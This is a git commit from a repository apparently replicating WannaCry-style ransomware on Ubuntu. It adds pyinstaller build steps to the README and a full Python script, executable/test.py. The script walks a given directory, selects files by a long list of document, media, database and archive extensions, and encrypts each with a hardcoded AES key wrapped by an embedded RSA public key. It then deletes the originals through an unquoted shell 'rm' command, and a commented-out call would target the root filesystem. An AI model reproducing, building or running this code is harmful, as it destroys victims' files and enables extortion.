460c9b2a32a68414488d2bda66f262f605ead551
ricardojoserf <rjruizfdez@gmail.com>
2018-06-06 02:52:14 -0700

    Added executable

--- README.md
+++ README.md
@@ -1,2 +1,15 @@
 # ubucryptor
 Trying to replicate (~) Wannacry encrypting in Ubuntu
+
+
+## Requirements
+
+sudo pip install pyinstaller
+
+
+
+## Creating the executable
+
+cat enc.py crypto.py >> test.py
+
+pyinstaller -F test.py
---
+++ executable/test.py
@@ -0,0 +1,101 @@
+import os,sys
+import base64
+import hashlib
+from Crypto.Cipher import AES
+import Crypto
+from Crypto.PublicKey import RSA
+
+BS = 16
+pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()
+unpad = lambda s: s[:-ord(s[len(s)-1:])]
+
+def iv():
+    return chr(0) * 16
+
+class AESCipher(object):
+
+    def __init__(self, key):
+        self.key = key
+
+    def encrypt(self, message):
+        message = message.encode()
+        raw = pad(message)
+        cipher = AES.new(self.key, AES.MODE_CBC, iv())
+        enc = cipher.encrypt(raw)
+        return base64.b64encode(enc).decode('utf-8')
+
+    def decrypt(self, enc):
+        enc = base64.b64decode(enc)
+        cipher = AES.new(self.key, AES.MODE_CBC, iv())
+        dec = cipher.decrypt(enc)
+        return unpad(dec).decode('utf-8')
+
+
+class RSACipher(object):
+
+	def encrypt(self, message):
+		f = open('public.pem', 'rb')
+		publickey = RSA.importKey(f.read())
+		encrypted = publickey.encrypt(message, 32)
+		return encrypted
+
+	def decrypt(self, enc_message):
+		f = open('private.pem', 'rb')
+		private = RSA.importKey(f.read())
+		decrypted = private.decrypt(enc_message)
+		return decrypted
+
+
+aes_key = 'r'*16
+pkeyname="public.pem"
+extensions=['123', 'jpeg', 'rb', '602', 'jpg', 'rtf', 'doc', 'js', 'sch', '3dm', 'jsp', 'sh', '3ds', 'key', 'sldm', '3g2', 'lay', 'sldm', '3gp', 'lay6', 'sldx', '7z', 'ldf', 'slk', 'accdb', 'm3u', 'sln', 'aes', 'm4u', 'snt', 'ai', 'max', 'sql', 'ARC', 'mdb', 'sqlite3', 'asc', 'mdf', 'sqlitedb', 'asf', 'mid', 'stc', 'asm', 'mkv', 'std', 'asp', 'mml', 'sti', 'avi', 'mov', 'stw', 'backup', 'mp3', 'suo', 'bak', 'mp4', 'svg', 'bat', 'mpeg', 'swf', 'bmp', 'mpg', 'sxc', 'brd', 'msg', 'sxd', 'bz2', 'myd', 'sxi', 'c', 'myi', 'sxm', 'cgm', 'nef', 'sxw', 'class', 'odb', 'tar', 'cmd', 'odg', 'tbk', 'cpp', 'odp', 'tgz', 'crt', 'ods', 'tif', 'cs', 'odt', 'tiff', 'csr', 'onetoc2', 'txt', 'csv', 'ost', 'uop', 'db', 'otg', 'uot', 'dbf', 'otp', 'vb', 'dch', 'ots', 'vbs', 'der\xe2\x80\x9d', 'ott', 'vcd', 'dif', 'p12', 'vdi', 'dip', 'PAQ', 'vmdk', 'djvu', 'pas', 'vmx', 'docb', 'pdf', 'vob', 'docm', 'vsd', 'docx', 'pfx', 'vsdx', 'dot', 'php', 'wav', 'dotm', 'pl', 'wb2', 'dotx', 'png', 'wk1', 'dwg', 'pot', 'wks', 'edb', 'potm', 'wma', 'eml', 'potx', 'wmv', 'fla', 'ppam', 'xlc', 'flv', 'pps', 'xlm', 'frm', 'ppsm', 'xls', 'gif', 'ppsx', 'xlsb', 'gpg', 'ppt', 'xlsm', 'gz', 'pptm', 'xlsx', 'h', 'pptx', 'xlt', 'hwp', 'ps1', 'xltm', 'ibd', 'psd', 'xltx', 'iso', 'pst', 'xlw', 'jar', 'rar', 'zip', 'java', 'raw']
+
+
+def create_key():
+	f= open(pkeyname,"w+")
+	f.write('-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtS5K6YGROGa01x8HhPo2\nkaKn+Gme3ihCI7dieh09iaAphXbjhNsKuE309J8nFZKecuImfQt8bERmerd9ndom\nmIQfJSY9iCzhEOhL5xsSOfqEzFaYBTcRdpgKNQBwk7BCsRjSuN8MPvuwaPKG9FxF\nTOo5lEGz+lFUlhKeVk8YFl8KQCr7RNleQ4I+ZHp/3qWWNlD5CGY5O7h7H2j6Ylgw\nDSCmx4yO0xVEV0OHAZkyM4zZzay03/bfYpcnmWUrN2nWlRfHQ6h1uIjjCo5Xafmr\n6veSASe95V+9uU9FOGFrJggDQSX9zLzJfzUoqla429Zd6D4h2zIf0Oyu7srxRBQx\nIQIDAQAB\n-----END PUBLIC KEY-----\n')
+	f.close()
+
+
+def encrypt_(fname):
+	message =open(fname).read()
+	enc_message = RSACipher().encrypt(str(AESCipher(aes_key).encrypt(message)))
+	enc_name=fname+".enc"
+	f= open(enc_name,"w+")
+	f.write(str(enc_message))
+	f.close()
+	os.system("rm "+fname)
+
+
+def enc_files(dir_):
+	try:
+		onlyfiles = [f for f in os.listdir(dir_) if os.path.isfile(os.path.join(dir_, f))]
+		for f in onlyfiles:
+			splitted=f.split(".")
+			if len(splitted)>=2:
+				if splitted[len(splitted)-1] in extensions:
+					file_=os.path.join(dir_, f)
+					print "Encrypting",file_,"..."
+					encrypt_(file_)
+	except:
+		pass
+
+def loop(looped_dir):
+	#Files in the root dir
+	enc_files(looped_dir)
+	#Directories inside
+	for root,directories,filenames in os.walk(looped_dir):
+		for directory in directories:
+			dir=os.path.join(root, directory)
+			#print "Entering",dir,"..."
+			enc_files(dir)
+
+
+def main():
+	create_key()
+	#loop("/")
+	loop(sys.argv[1])
+	os.system("rm "+pkeyname)
+
+if __name__== "__main__":
+  main()
